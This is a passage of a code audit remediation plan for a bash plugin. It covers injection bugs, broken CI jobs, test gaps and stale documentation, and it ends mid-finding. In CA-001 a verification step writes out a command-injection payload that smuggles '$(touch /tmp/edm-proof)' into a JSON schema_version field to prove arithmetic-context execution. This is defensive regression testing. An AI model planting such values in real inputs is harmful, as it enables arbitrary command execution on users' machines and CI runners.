# Code Audit Remediation Plan: EDMV3 -- Prompt Streamline

## Context

- Audit date: 2026-07-28
- Round: pass-1, **full** (all eleven lenses ran; `lenses-run.txt` records `Round type: full`)
- Branch: `edm/edmv3-prompt-streamline`
- Audited scope: `plugins/edm/**` (bin, skills, agents, hooks, evals, tests, CLAUDE.md, CHANGELOG),
  repository-root `.gitlab-ci.yml` and `.gitignore`, and this initiative's ticket pack
- SRD: `SRD/edm/EDMV3__prompt-streamline/srd.md` (v1.3.0)
- Ticket pack: `SRD/edm/EDMV3__prompt-streamline/tickets/README.md`
- Decision ledger consulted: `SRD/edm/EDMV3__prompt-streamline/decisions.md` (D1-D32)
- Deployment target: local plus GitLab CI (`plugins/edm/**` pipeline)
- Ledger: `SRD/edm/EDMV3__prompt-streamline/code-audit/findings-ledger.jsonl` (created this round;
  no prior round exists, so every finding is `raised_round: 1`)

## Convergence verdict: NOT CONVERGENT

2 open P0, 39 open P1 and 60 open P2 findings remain. `BLOCKING_FILTER` in `plugins/edm/bin/edm-state`
includes open P2, so all 101 are in the blocking set and none of them is a parking space. This was a
full round, so the partial-round rule does not apply -- the round is simply not convergent on its
merits. No closure note is written.

## Counts

| Severity | Open | Fixed this round | Noted |
|---|---|---|---|
| P0 | 2 | 2 | -- |
| P1 | 39 | 1 | -- |
| P2 | 60 | 0 | -- |
| NOTED | -- | -- | 28 |

Total ledger entries: 132. Fixed in commit `4890bfc` before synthesis: CA-003, CA-004, CA-044.
Not-actionable filtered: 28 (see "Decisions / Non-Findings"), of which 6 are recorded scope
boundaries in `decisions.md` (D8, D23, D26/D29, D27, D28, D30, D32) that a lens re-raised and that
this synthesis demoted rather than re-litigate.

## The three root causes that account for the most findings

1. **The ignore-marker and fence machinery was rewritten in `edm-lint-artifacts` and its three
   copies did not follow.** `edm-check-grants`, `edm-check-vocabulary` and
   `evals/score-artifacts.sh` each carry a hand-copied version of a helper whose canonical form
   changed this initiative. This produces CA-008, CA-009, CA-010, CA-017, CA-019, CA-038, CA-050,
   CA-057, CA-058 and CA-101 -- ten findings, five lenses, one root cause: no shared library.
   Two of the copies sit in **blocking** CI jobs, so the divergence is a red pipeline, not a nit.
2. **A shipped helper's status or output is captured in a way that cannot observe failure.** GitLab
   Runner emits `set -eo pipefail`, so `cmd; rc=$?` aborts before the capture; a command
   substitution inside a heredoc yields empty on error; a `grep -c` with no match aborts a suite
   instead of failing an assertion; a hook branches on any non-zero and loses a two-valued exit
   contract. This produces CA-007, CA-011, CA-016, CA-023, CA-036, CA-042, CA-051, CA-064, CA-083
   and CA-085. The common remedy is `rc=0; cmd || rc=$?` plus a branch that names what happened.
3. **Prose that describes the pre-change code, in files that are themselves the contract.** The
   wave-C code changes landed and their documentation did not: CA-012, CA-017, CA-018, CA-031,
   CA-034, CA-068, CA-069, CA-070, CA-071, CA-072, CA-073, CA-090, CA-091, CA-092, CA-095. The
   sharpest instance is CA-018 -- the severity table inside `edm-audit-synthesizer.md`, the agent
   that assigns ledger severity, is the abolished legacy scale relabelled.

---

# P0

## CA-001 (P0, lenses L8 + L1): `schema_version` still reaches bash arithmetic uncoerced

**Site**: `plugins/edm/bin/edm-state:799` (`schema_at_least`), `:1856` (`cmd_migrate_schema`).

**Problem**: The CA-003 fix coerced every `.current_phase` read inside its jq filter and added the
`to_int` helper at `:84`, whose own docstring states: "Every value read out of `.edm-state.json`
that reaches an arithmetic context MUST pass through here first." Two sinks do not.
`schema_at_least` receives `sv` from an uncoerced `jq -r '.schema_version // empty'` at eight or
more call sites (for example `:939`, `:1332-1333`, `:1794`) and evaluates `[[ "$sv" -ge "$min" ]]`.
`cmd_migrate_schema` reads `current_version` the same way at `:1794` and evaluates
`[[ "$target_version" -le "$current_version" ]]` at `:1856`. The injection class is therefore live
on a second field, in the same threat model the fix documents: a committed `.edm-state.json` arriving
by clone or `git pull`, read by the SessionStart hook and by the blocking `test:state-validate` job.
`cmd_set` refuses `schema_version` on write and `migrate-schema` coerces with `tonumber`, but the
whole point of CA-003 was that a state file can arrive without passing through either.

L8 listed both sinks in its P0 sink list and its Noted section says the `schema_version` case is
"subsumed by the L8-01 fix". It is not -- the applied fix covered `.current_phase` only. L1
independently reached the same site and filed the graceful-degradation half as Noted.

**Fix**: at `:1794` and at every `schema_version` read that feeds `schema_at_least`, coerce in the
jq filter exactly as `.current_phase` now does:

```bash
current_version="$(echo "$state" | jq -r '(.schema_version // empty) | if type == "number" then floor else empty end')"
```

and, for defence in depth inside the helper, `sv="$(to_int "$1" "")"` before the comparison at
`:799`, keeping the empty case on the existing "absent" branch. Do not rely on jq alone: a
hand-written `"schema_version": "2.0"` must reach the "below minimum" branch, not a bare arithmetic
syntax error out of a hook.

**Verification**: `printf '%s' '{"prefix":"XX","schema_version":"a[$(touch /tmp/edm-proof)]"}' >`
a scratch state file, run `edm-state validate`, `gate-check`, `phase-complete` and `migrate-schema`
against it, and assert `/tmp/edm-proof` does not exist and each command exits with a named
diagnostic. Add the case to `wave6-smoke.sh` next to the existing `current_phase` case so the two
sinks are covered by one pattern.

**Files affected**: `plugins/edm/bin/edm-state`, `plugins/edm/bin/tests/wave6-smoke.sh`.

---

## CA-002 (P0, lens L4): `cmd_update_patterns` insertion has zero coverage and a test that passes on a no-op

**Site**: `plugins/edm/bin/edm-state:3547-3591`, `:3431-3449`; test at
`plugins/edm/bin/tests/wave7-smoke.sh:1575-1598`.

**Problem**: The heading-targeted insertion shipped with no test that inserts anything. The only
test seeds a deliberate duplicate and asserts "no novel findings" plus byte-identity -- both
satisfied by a `cmd_update_patterns` that does nothing at all: an empty normalizer, a
`pattern_insert_line_for` returning 0, or a non-matching `grep '^### '` all pass it. Untested: the
insertion itself, the `pending-review` Append Schema block, the atomic `mv`, per-entry
`_insert_line` recomputation, the `---` back-up, the last-section EOF case, the missing-heading SKIP
whose contract is "never fall back to EOF", the not-writable skip, and
`pattern_target_heading_for`. Compounding it, the test resolves `pattern_file` from `$0`'s
directory, which `with_scratch_repo` does not redirect, so **if de-duplication regresses the test
writes into committed plugin source**; and because it targets the second heading, the four-heading
contract check would not catch that either. `wave7:2570-2578` and `:2844-2847` record the whole
block BLOCKED-ON-OWNER: the code landed and the tests did not.

Graded P0 rather than P1 because there is no evidence the feature works at all, the same function
carries two further open defects (CA-055 no lock, CA-015 untrapped temp in a tracked directory), and
its failure mode is silent corruption of a committed pattern document.

**Fix**: copy `bin/` and `docs/` into the scratch directory and invoke the scratch binary, as
`t30_ac2_case` already does. Then one case with two novel headings plus a duplicate asserting:
exactly two entries appended, both `pending-review`, both inside `## Anti-Patterns`,
`_t56_four_heading_contract_check` clean afterwards, the duplicate skipped, and a second run
appending nothing. A second case with the target heading removed asserting the SKIP message and
byte-identity of the document.

**Verification**: `bash plugins/edm/bin/tests/wave7-smoke.sh`, then revert the insertion body to a
`return 0` stub and confirm the new cases fail.

**Files affected**: `plugins/edm/bin/tests/wave7-smoke.sh`.

---

## CA-003 (P0, lens L8): FIXED in `4890bfc` -- arithmetic-context command injection via `.current_phase`

`plugins/edm/bin/edm-state:2726` and its siblings. Every `.current_phase` read now coerces inside
the jq filter (`(.current_phase // 0) | if type == "number" then floor else 0 end`) and the `to_int`
guard was added at `:84` with the threat model documented in place. Verified against the current
tree. **Residual: CA-001** -- the `schema_version` sinks from the same finding were not covered.

## CA-004 (P0, lens L11): FIXED in `4890bfc` -- `audit-round-start` called without `--lenses`

`plugins/edm/skills/code-audit/SKILL.md:49` now reads
`N=$(edm-state audit-round-start <PREFIX> code --lenses "${LENS_SET_CSV}")`, and `:37` states that
step 4 must pass it or the round is recorded as `full`. The partial-round convergence refusal is
reachable from its only real caller again. Add the assertion L11 asked for (the skill's
`audit-round-start` line contains `--lenses`) so the argument cannot silently fall out again -- that
assertion does not exist yet and is folded into CA-100's fix.

---

# P1

Multi-lens findings first; they are the highest-confidence signal in this round.

## CA-005 (P1, lenses L1 + L2 + L6 + L7 + L10): five lenses, one truncated help block

**Site**: `plugins/edm/bin/edm-check-grants:66-69`; same defect at `plugins/edm/evals/run-eval.sh:55`
and `plugins/edm/evals/score-artifacts.sh:100`.

**Problem**: `usage() { sed -n '2,45p' "$0"; exit 0; }` over a header that runs to line 57, so
`--help` silently cuts the Output format paragraph, the **Exit codes contract** and the bash-3.2
note. This is the exact anti-pattern EDMV3-T61 AC1 replaced with `EDM-HELP-BEGIN`/`EDM-HELP-END`
sentinels in five siblings; three scripts were missed, and `edm-check-grants` shipped after the fix.
`run-eval.sh` is worst: `--help` ends mid-sentence and hides the two exit codes CI keys off.
`wave7-smoke.sh:208-213` asserts against an exit contract that `--help` does not print. L7 adds two
further axes: `edm-sync-canonical-sections:42-45` is a third extractor variant keyed on
`^set -euo pipefail`, which breaks if that line moves; help splits four ways across the nine
`bin/` helpers (three accept a bare `help`, three do not, two strip the `# ` prefix and three keep
it), and **`edm-init` and `edm-validate-prefix` have no help at all** -- `edm-init --help` prints an
error to stderr and exits non-zero.

**Fix**: wrap each header in `# EDM-HELP-BEGIN` / `# EDM-HELP-END` and call the shared extractor
`print_help` (`edm-state:97`), which the shared library in CA-050 should own. Standardise the
dispatch on `-h|--help|help` in all nine helpers and add help blocks to `edm-init` and
`edm-validate-prefix`. Add a CI grep banning `sed -n '[0-9]*,[0-9]*p' "$0"` so the class cannot
return, and point `wave7:569-574` (which re-implements the extractor to audit help blocks) at the
shared function.

**Verification**: for each of the nine helpers, `bash <script> --help | tail -5` reaches the last
line of its header, and `bash <script> --help | grep -c 'Exit codes'` is 1 where the header has one.
`grep -rn "sed -n '[0-9]*,[0-9]*p' \"\$0\"" plugins/edm/` returns nothing.

**Files affected**: `bin/edm-check-grants`, `bin/edm-sync-canonical-sections`, `bin/edm-init`,
`bin/edm-validate-prefix`, `evals/run-eval.sh`, `evals/score-artifacts.sh`, `.gitlab-ci.yml`,
`bin/tests/wave7-smoke.sh`.

## CA-006 (P1, lenses L1 + L2 + L7 + L8): `apt-get` on an Alpine image, so the bash-3.2 proof does not exist

**Site**: `.gitlab-ci.yml:275-284`, specifically `:281`.

**Problem**: `before_script` runs `apt-get update && apt-get install -y jq git` against
`image: "bash:3.2"`. The Docker Official `bash` image is built `FROM alpine` and ships `apk`, not
`apt-get`. The first command fails, the job errors before `script:`, it carries no `allow_failure`,
so it red-lines every MR touching `plugins/edm/**` -- while the commitment it exists to discharge
(T61 AC10, "only actually running the suite under bash 3.2 proves the constraint holds end-to-end")
is unfulfilled. All ten sibling jobs use `apk add`. With the macOS runner deliberately omitted,
**no job currently exercises the plugin under its declared target shell.** `CLAUDE.md` names this
job as the end-to-end proof and calls CI the primary verification path.

**Fix**: `- apk add --no-cache jq git`. Add `bash --version | head -1 | grep -q 'version 3\.2'` as
the first `script:` line so a future image bump cannot pass this job while proving nothing. If no
runner can validate it, it must carry `allow_failure: true` with a comment -- not a command that
cannot work.

**Verification**: one pipeline run showing `test:smoke-bash32` green with the version assertion in
its log; `grep -c 'apt-get' .gitlab-ci.yml` returns 0.

**Files affected**: `.gitlab-ci.yml`.

## CA-007 (P1, lenses L1 + L2 + L3 + L11): failure-status captures that cannot observe failure

**Site**: `.gitlab-ci.yml:327-336`, `:474-480`, `:531-537`; `plugins/edm/evals/run-eval.sh:437-455`
and `:449`.

**Problem**: GitLab Runner emits `set -eo pipefail` at the top of every generated job script, and an
assignment from a command substitution carries that command's status, so a non-zero result aborts at
the assignment -- before `$?` is read and before every branch that reads it. `set -u` at `:310` and
`:468` does not clear an inherited `-e`.

- `:327-336` (**blocking** `test:state-validate`): a blocking anomaly is exit 3, so `ec=$?`, the
  `BLOCKING anomaly in <prefix>` line, the remaining loop iterations and the summary are all
  unreachable. A job designed to sweep every initiative and fail once naming the code collapses to
  "die at the first one, naming nothing".
- `:474-480`: the `claude plugin validate` structural-error message is unreachable.
- `:531-537`: `plugins/edm/evals/baseline/scores.json` is intentionally absent (D23), so
  `edm-compare-eval` exits 3 on **every** run, making the `3) ... NOT ARMED` arm -- the entire point
  of reserving exit 3, and the arm that would fire on the first real nightly -- dead code in its
  only consumer.
- `run-eval.sh:437-455`: the containment check expands `$(cd ... && git status --porcelain)` inside
  a heredoc. If either half fails (a stray `.git/index.lock`, a reaped TMPDIR) the substitution is
  empty, no violations are recorded, and it prints `containment: clean` and exits 0 -- the safety
  property was never evaluated. At `:449`, `path="${line:3}"` also mis-parses porcelain rename
  records, so a rename whose destination escapes `SRD/` passes as contained.

**Fix**: the `|| rc=$?` idiom already used correctly at `edm-state:705`, `:1308`, `:2023`, `:3883`
and `wave7-smoke.sh:3014`:

```bash
rc=0
out="$(edm-state validate "$prefix" 2>&1)" || rc=$?
printf '%s\n' "$out"
case "$rc" in
  0) ;;
  3) echo "BLOCKING anomaly in ${prefix} (exit 3)"; fail=1 ;;
  *) echo "unexpected exit ${rc} in ${prefix}"; fail=1 ;;
esac
```

For `run-eval.sh`, capture status and output separately, `die` if the check could not run at all,
and parse the porcelain rename form (`R  old -> new`) rather than slicing three characters.

**Verification**: seed a scratch initiative with a blocking anomaly and confirm the job prints the
prefix, the code and the summary and then fails once; remove `baseline/scores.json` and confirm
`eval:nightly` prints `NOT ARMED`; make `git status` fail inside the containment check and confirm
the driver dies instead of printing `clean`.

**Files affected**: `.gitlab-ci.yml`, `plugins/edm/evals/run-eval.sh`.

## CA-008 (P1, lenses L1 + L2 + L3): the class-2 PCRE branch mis-parses `grep -n`, so suppression is inoperative in CI

**Site**: `plugins/edm/bin/edm-lint-artifacts:363`.

**Problem**: `while IFS=: read -r _f lineno _rest` reads three fields from a `grep -n` that emits
two -- `-H` is not passed and exactly one file is given, so the output is `LINENO:content`. `_f`
gets the line number and `lineno` gets the first colon-delimited chunk of file text. Three
consequences: `is_ignored_line "$lineno" "$ignore_set"` compares text against a set of line numbers
and can never match, so **the documented code-fence and `edm-lint-ignore` suppression is entirely
inoperative for the unicode class**; `sed -n "${lineno}p"` errors into `/dev/null` so `snippet` is
always empty; and the emitted record puts prose in the documented `path:line:` field. It is provably
an editing slip -- the three sibling readers are two-field and correct (class 1 at `:349`, the
non-PCRE class-2 fallback at `:375`, class 3 at `:392`), and `_f` is absent from the `local`
declaration. `_has_pcre_grep` is 1 on GNU grep, **which the blocking `lint:artifacts` job runs**,
and 0 on macOS BSD grep, so the correct branch runs on the developer's machine and the broken one
runs in CI. L2 records the same shape latent at `edm-check-vocabulary:259-261`.

**Fix**: `while IFS=: read -r lineno _rest; do` and drop `_f` (keep the non-PCRE fallback -- it is
the only working path on macOS). Add a fixture with a non-ASCII character inside a fence and assert
`--path` reports zero violations under both branches; `wave7:1812`'s `check_absent` cannot detect a
mis-parsed line number.

**Verification**: `bash plugins/edm/bin/edm-lint-artifacts --path <fixture-with-fenced-non-ascii>`
returns 0 on both a GNU-grep and a BSD-grep host; the reported line field is numeric on a genuine
violation.

**Files affected**: `plugins/edm/bin/edm-lint-artifacts`, `plugins/edm/bin/tests/fixtures/`,
`plugins/edm/bin/tests/wave7-smoke.sh`.

## CA-009 (P1, lenses L7 + L10): the two mirrored ignore-set copies still anchor fences at column 1

**Site**: `plugins/edm/bin/edm-check-grants:139-173`, `plugins/edm/bin/edm-check-vocabulary:145-179`
against the canonical `plugins/edm/bin/edm-lint-artifacts:150-192`.

**Problem**: The canonical fence detector was changed this initiative to de-indent, with the reason
committed inline. Both mirrors still anchor at column 1. Roughly 60 indented fences are in scope of
both (for example `edm-test-coverage-auditor.md:87,89`, and six to eight per phase skill), so
content inside them is suppressed by the linter and **reported as a live violation by the blocking
`lint:vocabulary` job**. `edm-check-grants` has the inverse exposure on agent bodies. Worse than the
false positive: an odd number of undetected fence markers desynchronises `in_fence` for the whole
rest of the file, so even counts today are luck rather than design.

**Fix**: land CA-050 (extract the shared library) and delete both copies. If the extraction is
deferred within this remediation pass, port the de-indent change to both mirrors in the same commit
and add the assertion CA-010 describes.

**Verification**: `bash plugins/edm/bin/edm-check-vocabulary` and `bash plugins/edm/bin/edm-check-grants`
return 0 on a fixture whose indented fence contains a prohibited token, and non-zero when the same
token is outside the fence. Both must agree with `edm-lint-artifacts --path` on the same file.

**Files affected**: `bin/edm-check-grants`, `bin/edm-check-vocabulary`, new `bin/_edm-lint-lib.sh`.

## CA-010 (P1, lenses L7 + L10): the "mirrored VERBATIM" claim names a function that no longer exists

**Site**: `plugins/edm/bin/edm-check-grants:132-138`, `plugins/edm/bin/edm-check-vocabulary:50-52,140-144`.

**Problem**: Both comments claim their helper is "mirrored VERBATIM" from `edm-lint-artifacts`'s
`build_ignore_set`. That function no longer exists there -- it is `build_line_classes` (`:143`) --
and its behaviour changed (CA-009). The suite simultaneously asserts the source symbol is **gone**
(`wave7:1651`) and that the **mirror of it is present** (`wave7:283`), and passes: the one assertion
guarding this mirror greps for the dead symbol name, so it pins the drift rather than catching it.

**Fix**: rewrite both comments to name `build_line_classes` and state the one behavioural
difference, or -- preferably -- do CA-050 and delete the claim along with the copies. Replace
`wave7:283`'s literal-name grep with a behavioural assertion, and add a check that any comment
claiming a mirrored symbol names a symbol that exists in the named file.

**Verification**: `grep -rn 'build_ignore_set' plugins/edm/` returns only intentional history;
`bash plugins/edm/bin/tests/wave7-smoke.sh` passes with the behavioural assertion in place of the
name grep.

**Files affected**: `bin/edm-check-grants`, `bin/edm-check-vocabulary`, `bin/tests/wave7-smoke.sh`.

## CA-011 (P1, lenses L3 + L6): the commit hook does not read the exit-code split it is the named consumer of

**Site**: `plugins/edm/hooks/hooks.json:86`; contract at `plugins/edm/bin/edm-lint-artifacts:31-34`.

**Problem**: The help block states exit 2 is kept distinct "so the PreToolUse git-commit hook can
tell a misinvocation from a dirty tree". The hook branches on any non-zero. So a staged deletion
(`git rm -r SRD/OLDPFX/`), a pre-plugin `SRD/LEGACY-DOCS/`, a flat-layout file with a double
underscore, or an absent `edm-state` all produce exit 2 and block the commit with "Fix artifact
violations before committing" when there are no violations. L3 adds a second half worth settling
deliberately: a `PreToolUse` hook blocks only on exit 2, and this hook exits `$fail` (1), so the
honest violation path may not block the commit either -- while `CLAUDE.md` describes it as blocking.
Exit 1 and exit 2 must not map to one outcome in either direction.

**Fix**: capture the status, branch on it, and give the two cases different messages; derive prefixes
only from paths that resolve to a state file. Settle the exit-1-versus-exit-2 blocking semantics with
whoever owns hook semantics and make the hook's exit code match the documented policy. Fix in one
edit with CA-023, which is the same hook block.

**Verification**: stage a deletion of a whole initiative directory and confirm the commit is allowed
with an informational message naming the skipped prefix; stage a file with a real attribution
trailer and confirm the commit is blocked.

**Files affected**: `plugins/edm/hooks/hooks.json`, `plugins/edm/bin/edm-lint-artifacts` (help text),
`plugins/edm/CLAUDE.md`.

## CA-012 (P1, lenses L2 + L6): `CLAUDE.md` documents the pricing branch that was removed and inverts the diagnostic

**Site**: `plugins/edm/CLAUDE.md:448-464`.

**Problem**: The whole "gap that leaves" subsection describes the bare family wildcards
(`*opus*`/`*sonnet*`/`*haiku*`) that D32 removed hours earlier, states the arm order wrongly, and
tells the reader that a newer in-family generation is priced **silently with no warning** -- the
opposite of current behaviour, where `claude-opus-5-20260501` matches nothing, falls to `*)` and
warns on every run. It then directs hand-cross-checking because "nothing marks it as suspect", when
the mechanism now marks it automatically. A reader following this section reaches the wrong
conclusion about whether recorded cost figures carry a signal.

**Fix**: rewrite to describe the eight actual arms in their actual order, and keep the spirit as "a
warned figure is a placeholder, not a measurement". Cross-reference D32 and CA-105 for the open
work (verified Sonnet 5 / Fable 5 / Opus 5 rate rows, owned by EDMV4). Fix in the same pass as
CA-070, which is three more stale `CLAUDE.md` contracts.

**Verification**: the section's arm list matches `grep -n 'opus\|sonnet\|haiku' plugins/edm/bin/edm-state`
between `:335` and `:400`, arm for arm and rate for rate.

**Files affected**: `plugins/edm/CLAUDE.md`.

## CA-013 (P1, lenses L9 + L11): EDMV3-116's negative branch is half-landed and has no named owner

**Site**: `plugins/edm/docs/canonical-sections.md` (zero consumers);
`plugins/edm/bin/edm-sync-canonical-sections:67`; `srd.md:2842-2848` and `:3009-3012`;
`tickets/epics/06-mermaid-rule.md:152-158`, `:235-238`; `decisions.md:28` (D22), `:38` (D29).

**Problem**: Three findings with one root cause and one fix.
(a) The generator, the generated file and the byte-identity guard all exist, but
`grep -rn 'canonical-sections\.md' plugins/edm/{agents,skills}` returns **0 hits**, while roughly 50
`CLAUDE.md Sec."..."` references across 20 files still use the bare form D22 proved by two
independent methods does not resolve from an installed plugin cache. EDMV3-116 is Must Have and its
entire purpose is that the references resolve.
(b) EDMV3-54's AC mandates the bare form *exactly* (asserted by a `sort -u | wc -l` returning 1)
while EDMV3-116's negative branch mandates a plugin-relative path. Both cannot hold, and no change
request amends EDMV3-54 -- so an implementer fixing (a) breaks T42 AC4's smoke assertion.
(c) D22's closing paragraph leaves the work as "its own immediate follow-up ticket", which is the
one construction D29 forecloses ("a candidate is not a follow-on"), and D29's single surviving
ticket EDMV4-T01 is a different item. The largest open item in the initiative has no named owner and
no closing command.

**Fix**: one change request that (1) amends EDMV3-54's reference-form AC and T42 AC4 to the
`docs/canonical-sections.md` relative-path form; (2) updates the nine prompt-surface files plus the
eleven lens files and the synthesizer that carry `CLAUDE.md Sec."..."`; (3) re-points
`wave7-smoke.sh`'s "eleven Mermaid touch points" and canonical-heading cases at the new form; and
(4) records the work as a **named** ticket -- appended to D29's follow-on as EDMV4-T04 with a scope
line and a closing verify command, or landed here. Do not leave it as "a follow-up ticket".

**Verification**: `grep -rc 'docs/canonical-sections.md' plugins/edm/agents plugins/edm/skills`
returns the expected 20 files; `grep -rn 'CLAUDE\.md Sec\.' plugins/edm/agents plugins/edm/skills`
returns only sites deliberately retained; `bash plugins/edm/bin/tests/wave7-smoke.sh` green.

**Files affected**: `srd.md`, `tickets/epics/06-mermaid-rule.md`, `decisions.md`, 20 files under
`plugins/edm/agents` and `plugins/edm/skills`, `plugins/edm/bin/tests/wave7-smoke.sh`.

## CA-014 (P1, lenses L5 + L8): `mktemp` template suffix after the `X`s breaks the declared hard-target platform

**Site**: `plugins/edm/evals/tiering-matrix.sh:130-131`.

**Problem**: The template places `.json` after the `X`s. GNU accepts it; BSD/macOS `mkstemp(3)`
requires the last six characters to be `XXXXXX` and returns EINVAL, so `--self-test` takes the
`die "mktemp failed"` branch and exits 2 on the exact platform whose bash 3.2 is why the portability
constraint exists. That fails four assertions, which fails `wave7-smoke.sh`, which fails
`run-all.sh`. Both mechanisms meant to protect the constraint are blind to it: the T61 AC11
divergence sweep greps only `bin/` and only for `sed -i` / `grep -P` / `stat`. Separately,
`trap ... RETURN` fires on function return only, so a `die` or SIGINT leaks the file.

**Fix**: `mktemp "${TMPDIR:-/tmp}/edm-tiering.XXXXXX"` with no suffix (rename after creation if a
`.json` extension is needed), `trap ... RETURN EXIT INT TERM`, and extend the AC11 divergence sweep
to `evals/` and to `mktemp` templates, `date -d`, `readlink -f`, `sort -V`, `head -n -N` and
`printf %q`.

**Verification**: `bash plugins/edm/evals/tiering-matrix.sh --self-test` exits 0 with 3/3 on macOS;
the AC11 sweep reports the pre-fix form as a divergence when reintroduced.

**Files affected**: `plugins/edm/evals/tiering-matrix.sh`, `plugins/edm/bin/tests/wave7-smoke.sh`.

## CA-015 (P1, lenses L3 + L5): two untrapped `.tmp.$$` writers inside tracked directories

**Site**: `plugins/edm/bin/edm-state:3565-3583` (`docs/audit-patterns/`), `:2813-2821`
(`code-audit/findings-ledger.md`).

**Problem**: Neither write is trapped, and there is no trap anywhere in the script. `:3565` leaks
into the tracked `docs/audit-patterns/` on any signal in the loop body (once per novel finding) and
on any `set -e` abort from `head`, the `printf` block or `tail` -- including disk-full and a
read-only *directory*, since the guard tests `[[ -w "$pattern_file" ]]`, the file rather than the
directory, so a writable file in a non-writable directory produces a raw redirect abort instead of
the documented graceful skip. `:2813` is worse-placed: it lands in exactly the directory the
code-audit skill tells the operator to stage and commit, so it is likely to be swept in alongside
the real ledger. `$$` is also unsafe as a uniquifier -- two `edm-state` processes sharing a PID (two
containers bind-mounting one repo, two CI jobs on one runner) mutually truncate and the last `mv`
installs a half-spliced document.

**Fix**: add a shared `write_atomic <dest>` helper using `mktemp "${dest}.tmp.XXXXXX"` (the idiom
already at `edm-lint-artifacts:343`) with `trap 'rm -f "$tmp"' EXIT INT TERM` installed before the
write and cleared after the `mv`, and route all four hand-rolled sites through it (`:416`, `:1202`,
`:2813`, `:3565`). Test the *directory* in the read-only guard. Add
`plugins/edm/docs/audit-patterns/*.tmp.*` and `SRD/**/*.md.tmp.*` to `.gitignore` as belt and
braces.

**Verification**: `kill -TERM` an `edm-state update-patterns` mid-loop and confirm `git status` is
clean; run `update-patterns` with the pattern directory `chmod -w` and confirm the documented skip
message rather than an abort.

**Files affected**: `plugins/edm/bin/edm-state`, `.gitignore`.

## CA-016 (P1, lenses L4 + L7): the aggregator cannot distinguish a crashed suite from a green one

**Site**: `plugins/edm/bin/tests/run-all.sh:64-80`, `:81-96`, `:133`; second summary format at
`plugins/edm/bin/tests/wave4b-smoke.sh:175`.

**Problem**: `${_s_pass:-0}` means an aborted suite contributes `0 0`, so the aggregate prints
`Total: N passed, 0 failed` beside `FAILED SUITES` -- contradictory output that has already occurred
once in this initiative. Worse, a suite that prints nothing and exits 0 reports `PASS 0 0`,
indistinguishable from green. There is no floor on assertion count or suite count. And because
`wave4b` uses a second summary format, `run-all.sh` carries two parsers and falls through to a
silent `0 0` when neither matches -- so a newly auto-discovered suite adopting neither format
contributes nothing and still passes. This is the accounting layer every AC of the form "Verify:
`bash plugins/edm/bin/tests/run-all.sh`" rests on.

**Fix**: (1) status != 0 with no summary parsed -> print `CRASH <suite>` and add 1 to
`_total_fail`; (2) status 0 with no summary parsed -> fail, naming the suite; (3) assert a per-suite
minimum assertion count and a minimum suite count; (4) convert `wave4b-smoke.sh:175` to the
six-suite format and delete the second parser branch.

**Verification**: insert `exit 1` at the top of a suite and confirm the aggregate reports `CRASH`
and a non-zero total failure count; insert `exit 0` at the top and confirm the aggregate fails
naming the suite.

**Files affected**: `bin/tests/run-all.sh`, `bin/tests/wave4b-smoke.sh`.

## CA-017 (P1, lenses L6 + L1): the `build_line_classes` header documents two of three classes and misstates its own budget

**Site**: `plugins/edm/bin/edm-lint-artifacts:118-123`, `:136-137`, `:149`.

**Problem**: The header enumerates two of the **three** emitted classes -- `marker` is consumed as a
first-class set at `:317` and passed to `mermaid_scan_awk` at `:425` and is documented nowhere --
and the block's own follow-on comment at `:149` says "the three emitted classes", contradicting
itself four lines earlier. It also claims the 40 percent budget is "met by construction" by the
shared pass, which the recorded history disproves: after the shared pass the ratio was 3.40x,
*worse* than before, and reached 1.19x only after the separate class-4 rewrite (D26). L1 adds a
third defect in the same comment block: `:136-137` says the block-form escape valve works because
"class 4 skips any line that is ignored", when class 4 filters on `MARKER_SETS` and not
`IGNORE_SETS` (`:425`) -- and must, since every mermaid line is also in the ignored set.

**Fix**: document `marker`; replace the budget clause with the truth (the shared pass removes three
redundant reads, and class 4's own cost was fixed separately, per D26); correct `:136-137` to say
class 4 filters on the marker set.

**Verification**: the header's class list matches the sets `build_line_classes` emits at `:314-317`.

**Files affected**: `plugins/edm/bin/edm-lint-artifacts`.

## CA-018 (P1, lens L10): three restated severity tables, and the synthesizer's is the abolished legacy scale

**Site**: `plugins/edm/agents/edm-audit-synthesizer.md:87-92`,
`plugins/edm/agents/edm-srd-auditor.md:67-72`, `plugins/edm/skills/code-audit/SKILL.md:249-254`
against the canonical `plugins/edm/CLAUDE.md:215-220`.

**Problem**: All three cite the canonical section by name and then restate the table anyway, and all
three have diverged. `skills/code-audit/SKILL.md:251-252` drops "or architecturally wrong" from P0
and "missing requirement" from P1. `agents/edm-srd-auditor.md:69-70` drops "production failure" from
P0 and renders P1's "material gap" as "significant gap". The synthesizer's is the serious one:
its Definition column is the **abolished legacy P1/P2/P3 definitions with the labels shifted down
one** -- P0 reads "will cause production failure, security gap...", P1 reads "operational friction,
misleading messages...", P2 reads "defensive improvements..." -- which reproduces CLAUDE.md's
*backward-compatibility mapping* parentheticals rather than its canonical definitions. Its Action
column *was* updated to the canonical wording, so this is a half-applied edit. The consequence is
concrete: a lens-reported canonical P1 ("missing requirement", "material gap") matches no row of
the table the severity-assigning agent reads, and P2 is in `BLOCKING_FILTER`, so a mis-graded
finding changes whether a round converges.

**Disclosure**: `agents/edm-audit-synthesizer.md` is this synthesizer's own definition file. This
round was graded against `plugins/edm/CLAUDE.md:215-220`, the canonical scale, and not against that
file's table. Reported here without softening, because the file is in scope and the defect is real.

**Fix**: delete all three tables and keep the by-name reference plus the plugin-relative fallback
that CA-013 lands. If a summary must remain in the synthesizer, copy CLAUDE.md's Definition column
byte-for-byte. Add `edm-check-vocabulary` enforcement (or a smoke assertion) that no agent or skill
restates a severity Definition column, so a fourth copy cannot appear.

**Verification**: `grep -rn 'Defensive improvements\|operational friction' plugins/edm/agents plugins/edm/skills`
returns nothing; `grep -rc 'CLAUDE.md Sec."Severity vocabulary"'` still returns all previous sites.

**Files affected**: `agents/edm-audit-synthesizer.md`, `agents/edm-srd-auditor.md`,
`skills/code-audit/SKILL.md`, `bin/edm-check-vocabulary`.

## CA-019 (P1, lens L10): the scorer's copy of the Mermaid rule has diverged and scores two invalid fixtures as clean

**Site**: `plugins/edm/evals/score-artifacts.sh:242-279` against
`plugins/edm/bin/edm-lint-artifacts:213-283`.

**Problem**: The three stated reasons for not calling the linter directly are sound (dimension 3 is a
genuine superset, needs a per-block verdict stream, must never exit non-zero on a low score) -- but
the copies have already diverged in seven ways and produce wrong answers today, provable against
this plugin's own committed fixtures. The curly-label form is absent (so `invalid/i04-curly-label.md`
scores OK); the sequenceDiagram message rule is absent (so `invalid/i05-sequence-message.md` scores
